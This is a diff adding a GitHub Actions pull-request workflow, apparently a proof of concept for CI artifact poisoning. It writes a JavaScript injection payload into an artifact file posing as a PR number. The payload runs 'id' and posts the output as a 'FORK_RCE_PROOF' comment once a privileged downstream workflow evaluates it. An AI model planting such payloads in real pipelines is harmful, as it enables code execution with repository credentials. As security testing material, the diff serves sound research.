@@ -1,0 +1,18 @@
+name: PR validation
+on:
+  pull_request:
+
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Produce attacker-controlled lint-results artifact
+        run: |
+          mkdir -p out
+          echo "true" > out/has-warnings.txt
+          printf '%s\n' "1; const r = await exec.getExecOutput('id'); await github.rest.issues.createComment({issue_number: 2, owner: context.repo.owner, repo: context.repo.repo, body: 'FORK_RCE_PROOF ' + r.stdout.trim()})" > out/pr-number.txt
+      - name: Upload lint-results
+        uses: actions/upload-artifact@v4
+        with:
+          name: lint-results
+          path: out/
